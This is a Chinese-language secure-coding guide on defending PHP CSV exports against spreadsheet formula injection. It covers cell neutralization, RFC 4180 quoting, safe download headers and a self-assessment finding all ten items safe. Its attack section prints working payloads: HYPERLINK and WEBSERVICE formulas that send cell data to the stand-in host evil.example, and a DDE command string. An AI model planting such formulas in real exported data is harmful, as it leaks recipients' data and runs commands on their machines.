# 操作指南：在导出时防止 CSV / 电子表格公式注入

当你的 API 将用户提供的数据导出为 CSV 时，危险不在你的服务器上——而在**接收者的电子表格**上。Excel、Google Sheets 和 LibreOffice 会把文本以 `=`、`+`、`-`、`@`、制表符（`\t`）或回车符（`\r`）开头的单元格当作**公式**。能让 `=cmd|'/c calc'!A0` 或 `=HYPERLINK("https://evil.example/?"&A1)` 这样的字符串进入你数据库的攻击者，将在管理员打开导出文件时让它执行（DDE）或外泄整行数据。

这就是 **CSV 注入**（又称公式注入）。它是导出边界上的一个*输出编码*问题——与 [SQL 注入](sql-injection.md)（一个查询问题）以及 [CSV 批量导入](csv-bulk-import.md)（一个输入问题）是不同的。

**前提条件**：你有一个把行返回为 CSV 的端点。

---

## 1. 攻击

把下面这串存为一个完全合法的"显示名"，然后把表导出为 CSV 并在 Excel 中打开：

```
=HYPERLINK("https://evil.example/leak?d="&A1&A2, "Click for refund")
```

- `=...HYPERLINK...` — 被点击时把相邻单元格外泄到攻击者 URL。
- `=WEBSERVICE("https://evil.example/?"&A1)` — 在较旧的 Excel 中**无需点击**即可外泄。
- `=cmd|'/c calc'!A0` — DDE；在确认对话框之后可运行本地命令。

这一切都不触及你的服务器。你的校验通过了，你的 SQL 已参数化——而你仍然在一个"合法"的 CSV 中交付了一个可用的漏洞利用。

---

## 2. 修复：中和首字符

OWASP 推荐的基线：如果一个单元格的值以危险字符开头**且不是一个纯数字**，就给它加上一个单引号（`'`）前缀。Excel 随后会把该单元格渲染为字面文本。

```php
/**
 * Neutralize a value before writing it to a CSV cell so spreadsheet
 * software cannot interpret it as a formula.
 */
function neutralizeCsvCell(string $value): string
{
    if ($value === '') {
        return $value;
    }
    $dangerous = ['=', '+', '-', '@', "\t", "\r"];
    // Keep genuine numbers (incl. negatives like -50) intact; only quote
    // values that *start* dangerous and are not numeric.
    if (in_array($value[0], $dangerous, true) && !is_numeric($value)) {
        return "'" . $value;
    }

    return $value;
}
```

`!is_numeric()` 这道护栏是大多数实现做错的部分：盲目地给每个 `-`/`+` 加前缀，会把合法的数字 `-50` 变成文本 `'-50`，破坏接收者表格中的求和。数字直接通过；只有形如公式的字符串才会被加引号。

---

## 3. 与 RFC 4180 引用规则结合

中和处理公式；你仍然需要正确的引用，以便包含逗号、引号或换行符的值不破坏列结构（这是另一种注入向量）。让 `fputcsv` 来做，并用 `escape=""` 以获得严格的 [RFC 4180](https://www.rfc-editor.org/rfc/rfc4180) 行为（不进行反斜杠转义）：

```php
$fp = fopen('php://temp', 'r+');
foreach ($rows as $row) {
    fputcsv($fp, array_map('neutralizeCsvCell', $row), ',', '"', '');
}
rewind($fp);
$csv = stream_get_contents($fp);
```

输入 → 输出（已验证）：

```
=1+1                       → '=1+1
+budget                    → '+budget
@home                      → '@home
-50                        → -50            (real number, untouched)
=cmd|'/c calc'!A0          → "'=cmd|'/c calc'!A0"
a,b                        → "a,b"
he said "hi"               → "he said ""hi"""
```

> `escape=""` 很重要：PHP 历史上的默认转义字符（`\`）产生的输出**不**符合 RFC 4180，而且 Excel 会解析错误。务必传入 `""`。

---

## 4. 把它作为下载响应返回

在处理器中构建 PSR-7 响应。还有两个头部层面的细节很重要：

```php
$filename = 'export-' . date('Ymd') . '.csv';

return $responseFactory->createResponse(200)
    ->withHeader('Content-Type', 'text/csv; charset=UTF-8')
    // Sanitize the filename: strip CR/LF/quotes so it cannot inject extra headers.
    ->withHeader('Content-Disposition', 'attachment; filename="'
        . preg_replace('/[\r\n"]/', '', $filename) . '"')
    ->withBody($streamFactory->createStream("\u{FEFF}" . $csv));
```

- **`Content-Disposition: attachment`** — 强制下载，而不是让浏览器渲染这些字节（防御内容嗅探）。
- **`filename` 净化** — 永远不要在不剥离 `\r`、`\n` 和 `"` 的情况下插入用户可控的名称；否则它会变成一个头部注入向量。
- **BOM（`\u{FEFF}`）** — 可选；让 Excel 正确地以 UTF-8 打开。它不影响注入防御。

把中和处理保留在导出层（一个小的 `CsvWriter` value object）里，不要散落在各个处理器中——这样同一项保证就能覆盖每一个导出端点。

---

## 漏洞评估

### V-01 — 通过首字符 `=` 的公式注入 ✅ SAFE

**风险**：像 `=1+1` 或 `=HYPERLINK(...)` 这样的存储值在 CSV 被打开时执行。
**发现**：SAFE — `neutralizeCsvCell()` 加上 `'` 前缀，因此单元格被渲染为文本（`'=1+1`）。

---

### V-02 — DDE 命令执行（`=cmd|...`）✅ SAFE

**风险**：`=cmd|'/c calc'!A0` 触发 DDE 并可运行本地命令。
**发现**：SAFE — 该载荷以 `=` 开头且非数字，因此被加引号（`"'=cmd|'/c calc'!A0"`）。

---

### V-03 — 通过 `WEBSERVICE`/`HYPERLINK` 的数据外泄 ✅ SAFE

**风险**：`=WEBSERVICE("https://evil/?"&A1)` 泄露相邻单元格，有时无需点击。
**发现**：SAFE — 同样被中和；首字符 `=` 在到达函数名之前就被解除。

---

### V-04 — 首字符 `+`、`-`、`@` 触发器 ✅ SAFE

**风险**：Excel 也会对以 `+`、`-` 和 `@` 开头的单元格求值。
**发现**：SAFE — 这四个都在 `$dangerous` 集合中；`+budget` → `'+budget`，`@home` → `'@home`。

---

### V-05 — 制表符 / 回车符前缀绕过 ✅ SAFE

**风险**：某些解析器会剥离首部的 `\t` 或 `\r`，从而暴露下面的 `=`（`\t=1+1`）。
**发现**：SAFE — `\t` 和 `\r` 本身就在 `$dangerous` 集合中，因此整个单元格在任何剥离之前就被加引号。

---

### V-06 — 通过逗号 / 引号 / 换行符的列断裂 ✅ SAFE

**风险**：像 `a,b` 这样的值或内嵌的 `"`/换行符会把数据挪到错误的列（结构性注入）。
**发现**：SAFE — `fputcsv(..., escape: '')` 应用 RFC 4180 引用规则（`"a,b"`、`"he said ""hi"""`）。

---

### V-07 — `Content-Disposition` 文件名头部注入 ✅ SAFE

**风险**：包含 `\r\n` 的用户可控导出名注入额外的响应头。
**发现**：SAFE — 文件名在被放入头部之前经过 `preg_replace('/[\r\n"]/', '', ...)`。

---

### V-08 — 内容嗅探 / 内联渲染 ✅ SAFE

**风险**：没有 `attachment` 时，浏览器可能把 CSV 渲染为 HTML 并执行内嵌的标记。
**发现**：SAFE — `Content-Type: text/csv` + `Content-Disposition: attachment` 强制下载。

---

### V-09 — 合法的负数被破坏 ✅ SAFE（正确性）

**风险**：过度积极的中和把 `-50` 变成文本 `'-50`，破坏下游求和。
**发现**：SAFE — `!is_numeric()` 护栏让格式良好的数字（`-50`、`+1`、`-5e3`）原样通过。

---

### V-10 — 防御集中化 ✅ SAFE

**风险**：每个处理器临时构建 CSV 会让某个端点忘记中和处理。
**发现**：SAFE（符合设计）— 中和处理存在于单个导出层中，通过 `array_map` 应用，因此每个导出的每一列都被覆盖。

---

### VULN 汇总

| ID | 漏洞 | 发现 |
|----|---------------|---------|
| V-01 | 公式注入（`=`） | ✅ SAFE |
| V-02 | DDE 命令执行 | ✅ SAFE |
| V-03 | `WEBSERVICE`/`HYPERLINK` 外泄 | ✅ SAFE |
| V-04 | `+` / `-` / `@` 触发器 | ✅ SAFE |
| V-05 | 制表符 / CR 前缀绕过 | ✅ SAFE |
| V-06 | 逗号 / 引号 / 换行符列断裂 | ✅ SAFE |
| V-07 | 文件名头部注入 | ✅ SAFE |
| V-08 | 内容嗅探 / 内联渲染 | ✅ SAFE |
| V-09 | 负数被破坏 | ✅ SAFE |
| V-10 | 防御集中化 | ✅ SAFE |

**10 SAFE，0 EXPOSED。** 无重大发现。中和首字符规则（带数字护栏）加上 RFC 4180 引用规则以及一个 `attachment` 下载响应，封闭了 CSV 注入攻击面。唯一残留的注意点与人有关：在某些非电子表格的 CSV 解析器中，用于中和的 `'` 会显示为开头的一个撇号——这可以接受，因为另一种结局是在接收者的电子表格中执行代码。

---

## 相关

- [CSV 批量导入](csv-bulk-import.md) — 输入侧（部分成功、重复检测）
- [数据导出 API](data-export-api.md) — 异步的、令牌保护的导出流程
- [SQL 注入防御](sql-injection.md) — 查询侧的注入类别
